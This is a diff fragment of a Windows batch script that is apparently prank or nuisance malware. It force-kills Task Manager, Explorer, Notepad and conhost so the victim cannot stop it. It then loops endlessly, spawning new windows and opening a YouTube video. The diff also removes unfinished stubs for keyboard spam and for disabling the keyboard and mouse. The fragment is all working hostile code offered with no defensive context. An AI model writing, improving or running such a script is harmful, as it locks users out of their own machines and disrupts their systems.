@@ -20,45 +20,15 @@ goto :BigTing
 goto :anticlose
 
 
-goto :anticlose
+
 :anticlose
 taskkill /f /im taskmgr.exe
 taskkill /f /im notepad.exe
 taskkill /f /im explorer.exe
 taskkill /f /im conhost.exe
-
-goto :shrek
-goto :Keyboardspam
-goto :keyboarddisabler
-goto :mousedisabler
-goto :looper
-goto :end
-
-timeout /t 5
-goto 
-
-:loop 
-start 
 goto loop
 
-
-
-:Keyboardspam
-start key.vbs
-:keyboarddisabler
-echo Feature not complete!
-:mousedisabler
-echo Feature not complete!
-:soundspam
-echo Feature not complete!
-
-:shrek
+:loop
+start 
 start https://www.youtube.com/watch?v=pxw-5qfJ1dk
-
-
-
-
-
-
-
-
+goto BigTing
